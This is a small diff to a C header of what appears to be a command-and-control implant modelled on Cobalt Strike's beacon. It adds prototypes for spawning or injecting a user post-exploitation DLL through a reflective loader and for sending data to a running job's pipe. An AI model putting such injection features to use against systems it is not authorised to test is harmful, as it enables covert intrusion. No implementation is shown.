@@ -92,6 +92,12 @@ void command_job_kill(char * buffer, int length);
 /* this is a very complicated job to spawn, inject, and register a job */
 void command_job_spawn(char * buffer, int length, BOOL x86, BOOL ignoreToken);
 
+/* 4.10 execute-dll parity: spawn (pid 0) or inject (pid>0) a user postex
+ * DLL, passing a parameter blob through to the postex reflective loader */
+void command_job_spawn_user(char * buffer, int length, BOOL x86);
+/* 4.10 bjob_send_data: write a blob into a running job's pipe */
+void command_job_data(char * buffer, int length);
+
 /* spawn our temporary process */
 BOOL spawn_patsy(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi);
 
